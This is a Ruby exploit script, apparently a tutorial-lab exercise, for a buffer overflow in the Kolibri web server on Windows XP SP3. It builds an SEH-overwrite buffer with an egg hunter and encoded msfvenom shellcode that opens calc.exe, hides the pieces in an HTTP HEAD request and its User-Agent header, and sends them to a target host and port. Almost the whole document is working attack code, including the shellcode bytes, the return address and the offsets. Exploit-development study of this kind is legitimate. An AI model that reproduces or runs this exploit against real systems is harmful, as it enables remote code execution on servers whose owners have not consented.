# Brad Beacham 2018
#
#####################################################################################
# INFORMATION
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
# Confirmed on Windows XP SP3
####    SEH record (nseh field) at 0x0124ffa4 overwritten with normal pattern : 0x41347441 (offset 582) - Original with a filler to get buffer upto 1000 bytes
####    0x00435994 : pop edx # pop ebp # ret  | [Kolibri.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.1

# Badchars: "\x00\x0d\x0a\x3d\x20\x3f"
# nc -nv 192.168.217.133 9876

#####################################################################################

require 'socket'

# Appends notifications to the start of text (ie. [*], [+], etc)
#####################################################################################
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end		  # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end
# Some simple input validation
input = ARGV
if input[0].nil?
	puts "USAGE: KolibriExploit.rb [<ipaddres>:<port>]".error
	abort()
elsif !input[0].include? ":"
	puts "USAGE: KolibriExploit.rb [<ipaddres>:<port>]".error
	abort()
end
host = input[0].split(":").first
port = input[0].split(":").last

puts "#######################################################".event
#####################################################################################
# Generate the exploit

# Br4D Egg Hunter
egg = "\x42\x72\x34\x44" * 2
# 52 bytes including NOPs
hunter = 
"\x90" * 20 +
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" +
"\xef\xb8\x42\x72\x34\x44\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00\x0d\x0a\x3d\x20\x3f' -i 1 -f ruby
buf =
"\xda\xda\xb8\xba\xd4\x44\xf7\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x31\x31\x42\x18\x03\x42\x18\x83\xc2\xbe\x36\xb1\x0b" +
"\x56\x34\x3a\xf4\xa6\x59\xb2\x11\x97\x59\xa0\x52\x87\x69" +
"\xa2\x37\x2b\x01\xe6\xa3\xb8\x67\x2f\xc3\x09\xcd\x09\xea" +
"\x8a\x7e\x69\x6d\x08\x7d\xbe\x4d\x31\x4e\xb3\x8c\x76\xb3" +
"\x3e\xdc\x2f\xbf\xed\xf1\x44\xf5\x2d\x79\x16\x1b\x36\x9e" +
"\xee\x1a\x17\x31\x65\x45\xb7\xb3\xaa\xfd\xfe\xab\xaf\x38" +
"\x48\x47\x1b\xb6\x4b\x81\x52\x37\xe7\xec\x5b\xca\xf9\x29" +
"\x5b\x35\x8c\x43\x98\xc8\x97\x97\xe3\x16\x1d\x0c\x43\xdc" +
"\x85\xe8\x72\x31\x53\x7a\x78\xfe\x17\x24\x9c\x01\xfb\x5e" +
"\x98\x8a\xfa\xb0\x29\xc8\xd8\x14\x72\x8a\x41\x0c\xde\x7d" +
"\x7d\x4e\x81\x22\xdb\x04\x2f\x36\x56\x47\x25\xc9\xe4\xfd" +
"\x0b\xc9\xf6\xfd\x3b\xa2\xc7\x76\xd4\xb5\xd7\x5c\x91\x5a" +
"\x3a\x75\xef\xf2\xe3\x1c\x52\x9f\x13\xcb\x90\xa6\x97\xfe" +
"\x68\x5d\x87\x8a\x6d\x19\x0f\x66\x1f\x32\xfa\x88\x8c\x33" +
"\x2f\xeb\x53\xa0\xb3\xc2\xf6\x40\x51\x1b"

# nSEH should jump us back 50 bytes which should land us somewhere in our hunter nopsled
nseh = "\x90\x90\xEB\xCE"
sehoffset = 792
offset = sehoffset - (hunter.length + nseh.length)
# Because this address contains a NULL byte, we have to do everything else above this address (shouldnt be a problemo), as everything after the stack will effectivly be rendered useless.
seh = "\x94\x59\x43"
# SEH 0x0124ffa8
#stage1 = junk + nseh + seh
stage1 = ("\x41" * offset) + hunter + nseh + seh
#stage2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
stage2 = egg + buf
exploit = (
    "HEAD /#{stage1} HTTP/1.1\r\n" +
    "Host: #{host}:#{port}\r\n" +
    "User-Agent: #{stage2}\r\n" +
    "Keep-Alive: 115\r\n" +
    "Connection: keep-alive\r\n\r\n"
)

#####################################################################################
# Send the exploit
begin
    puts "Stage 1 size [#{stage1.length}] bytes.".notification
    puts "Stage 2 size [#{stage2.length}] bytes.".notification
    puts ""
    puts "Connecting to server [#{host}:#{port}] and sending evil buffer".event
    socket = TCPSocket.new(host, port)
rescue
    puts "Unable to connect to server!".error
else
    puts "Sucessfully connected!".success
	socket.write(exploit)
    socket.close
    puts "Exploit completed.  Calculator will spawn on the target shortly.".success
end
 
puts ""
